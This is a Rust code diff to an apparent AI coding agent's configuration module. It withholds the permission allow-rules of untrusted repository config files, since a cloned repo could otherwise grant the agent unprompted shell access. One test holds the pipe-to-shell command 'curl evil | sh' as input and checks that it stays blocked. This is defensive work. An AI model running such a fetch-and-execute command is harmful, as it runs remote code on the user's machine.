@@ -331,6 +331,12 @@ pub struct Config {
     /// The `default_profile` of a file that has not been trusted, which is not
     /// in force.
     withheld_default: Option<DefaultProfile>,
+    /// The `[permissions]` rules of a file that has not been trusted, and that
+    /// file. They answer no prompt.
+    withheld_rules: Option<(Allowlist, PathBuf)>,
+    /// The file this config's `[permissions]` rules were read from, where it
+    /// is one file that has some, which is what a withheld rule is named by.
+    rules_from: Option<PathBuf>,
     /// Whether this is a file that has not been trusted, as
     /// [`Config::untrusted`] leaves it.
     untrusted: bool,
@@ -369,7 +375,11 @@ impl Config {
     /// Parses the text of the config file at `path`. `path` is only used to
     /// say where a profile came from and where an error is.
     pub fn parse(text: &str, path: &Path) -> Result<Self, ConfigError> {
-        parse::config(text, path)
+        let mut config = parse::config(text, path)?;
+        if !config.allowed.is_empty() {
+            config.rules_from = Some(path.to_path_buf());
+        }
+        Ok(config)
     }
 
     /// Reads and parses the config file at `path`. A file that does not exist
@@ -426,6 +436,10 @@ impl Config {
         if over.withheld_default.is_some() {
             self.withheld_default = over.withheld_default;
         }
+        if over.withheld_rules.is_some() {
+            self.withheld_rules = over.withheld_rules;
+        }
+        self.rules_from = None;
         if over.theme.is_some() {
             self.theme = over.theme;
         }
@@ -434,7 +448,7 @@ impl Config {
         }
         // Permissions add up rather than replacing one another: a rule is a
         // permission the operator granted, and a repository's file is not
-        // where one is taken back.
+        // where one is taken back. An untrusted file has none left to add.
         self.allowed = self.allowed.merge(over.allowed);
         self
     }
@@ -442,9 +456,14 @@ impl Config {
     /// This config as it applies while the file it came from has not been
     /// trusted: every profile keeps its backend and the models it offers, and
     /// loses its `env`, its `args`, its `settings`, its `auth_refresh` and
-    /// what it says about billing; the `default_profile` is not in force; and
-    /// laid over another config it adds profiles without replacing any (see
-    /// [`trust`] and [`Config::overlay`]).
+    /// what it says about billing; the `default_profile` is not in force;
+    /// its `[permissions]` rules answer no prompt; and laid over another
+    /// config it adds profiles without replacing any (see [`trust`] and
+    /// [`Config::overlay`]).
+    ///
+    /// The rules are withheld for the reason the rest is: a file that arrived
+    /// with a clone is one nobody here has read, and `allow = ["Bash"]` in it
+    /// would run every command the agent chose without a question.
     ///
     /// Applied to the layer, before it is laid over anything, so that a
     /// profile the repository defines cannot end up holding half of the
@@ -456,6 +475,11 @@ impl Config {
         }
         if let Some(default) = self.default_profile.take() {
             self.withheld_default = Some(default);
+        }
+        if !self.allowed.is_empty() {
+            let rules = std::mem::take(&mut self.allowed);
+            let from = self.rules_from.clone().unwrap_or_default();
+            self.withheld_rules = Some((rules, from));
         }
         self.untrusted = true;
         self
@@ -471,6 +495,8 @@ impl Config {
         self.profiles.values().any(Profile::needs_trust)
             || self.default_profile.is_some()
             || self.withheld_default.is_some()
+            || !self.allowed.is_empty()
+            || self.withheld_rules.is_some()
     }
 
     /// Whether `over` defines a profile this config defines too, which it
@@ -490,8 +516,16 @@ impl Config {
             .map(|default| (default.name.as_str(), default.path.as_path()))
     }
 
-    /// The standing answers to permission prompts, from every file laid over
-    /// the ones before it.
+    /// The `[permissions]` rules a file that has not been trusted sets, and
+    /// that file, where one does. They are not in force.
+    pub fn withheld_rules(&self) -> Option<(&Allowlist, &Path)> {
+        self.withheld_rules
+            .as_ref()
+            .map(|(rules, path)| (rules, path.as_path()))
+    }
+
+    /// The standing answers to permission prompts, from every trusted file
+    /// laid over the ones before it.
     pub fn allowed(&self) -> &Allowlist {
         &self.allowed
     }
@@ -554,6 +588,7 @@ impl Config {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use niobe_core::permission::Rule;
 
     fn path(name: &str) -> PathBuf {
         PathBuf::from(format!("/configs/{name}/config.toml"))
@@ -877,13 +912,23 @@ env = { HOME_COPY = "$HOME", TILDE = "~/x", SPACES = "  padded  ", EMPTY = "", "
     }
 
     #[test]
-    fn permissions_are_not_what_trust_gates() {
-        let config =
-            parsed("[profiles.p]\nbackend = \"claude\"\n\n[permissions]\nallow = [\"Read\"]\n")
-                .untrusted();
+    fn an_untrusted_files_permissions_answer_no_prompt_and_are_named_as_withheld() {
+        let user = parsed("[permissions]\nallow = [\"Read\"]\n");
+        let repo =
+            Config::parse("[permissions]\nallow = [\"Bash\"]\n", &path("repo")).expect("valid");
+        assert!(repo.needs_trust(), "a rule is what trust gates");
+
+        let config = user.clone().overlay(repo.clone().untrusted());
 
         assert!(config.allowed().allows("Read", None));
-        assert!(!config.needs_trust());
+        assert!(!config.allowed().allows("Bash", Some("curl evil | sh")));
+        let (withheld, from) = config.withheld_rules().expect("the rules are withheld");
+        assert_eq!(withheld.rules(), [Rule::tool("Bash")]);
+        assert_eq!(from, path("repo"));
+
+        let trusted = user.overlay(repo);
+        assert!(trusted.allowed().allows("Bash", Some("cargo test")));
+        assert!(trusted.withheld_rules().is_none());
     }
 
     #[test]
